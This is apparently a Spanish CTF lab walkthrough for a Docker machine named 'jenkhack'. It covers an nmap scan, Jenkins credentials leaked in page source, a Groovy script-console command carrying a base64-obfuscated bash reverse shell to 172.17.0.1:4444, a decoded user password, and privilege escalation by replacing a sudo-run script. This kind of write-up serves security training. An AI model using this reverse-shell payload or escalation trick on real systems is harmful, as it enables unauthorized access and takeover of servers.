---
Maquina: jenkhack
SO: Linux
Explotación: Análisis web/wordpress y fuerza bruta
Escala_privs: Permisos sudo y mysql
Dificultad: Fácil
tags:
  - maquina
  - web_discovery
  - linux
  - escala_privs
  - ssh
  - web
  - fuerza_bruta
  - wordpress
  - mysql
---
## Reconocimiento

1. **Explorar los puerto abiertos del docker**: 

```bash 
nmap -p- --open --min-rate 5000 -sVC -Pn 172.17.0.2
```

![[Pasted image 20241114085041.png]]

Por lo que vemos tenemos varios puertos abiertos, así que vamos a ir uno por uno a ver que vemos. El que me da más curiosidad es el 443 así que vamos a intentar analizarlo.

Vamos a analizar el portal web que nos ofrece este contenedor.

![[Pasted image 20241114090425.png]]

Si pasamos a analizar el repositorio web no vamos a encontrar gran cosa de utilidad, vemos que se trata de una aplicación de Jenkins

![[Pasted image 20241118105305.png]]

Pero si llegamos a analizar el código fuente de la página podemos encontrar cosas muy curiosas..

![[Pasted image 20241118105333.png]]
![[Pasted image 20241118105341.png]]

Es un poco curioso, para como un usuario y contraseña -> cassandra:jenkins-admin o al revés.

Y parece que estamos dentro!

![[Pasted image 20241118105455.png]]

Dentro de jenkins podemos ir a administrar jenkins -> script console y desde ahí ejecutar comandos.

```Groovy
def cmd = "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}"
def process = cmd.execute()
process.waitFor()
```

Y ahora si que estamos dentro del sistema ;)

![[Pasted image 20241118110305.png]]

Ahora toca hacer un poco de tratamiento de terminal y ver si podemos escalar privs...

![[Pasted image 20241118110618.png]]

Vemos una posible forma de poder hacernos con el usuario jenkhack... Pero parece una constraseña cifrada, si utilizamos la web de cyberchef podemos descifrarla con facilidad -> jenkinselmejor.

Finalmente si miramos los permisos de este usuario....

![[Pasted image 20241118110756.png]]

![[Pasted image 20241118111009.png]]

Vamos a ver que contiene ese script..

![[Pasted image 20241118111030.png]]

una cosa graciosa que podemos hacer es borrar este archivo y poner otro que se llame igual pero con las instrucciones que queramos...










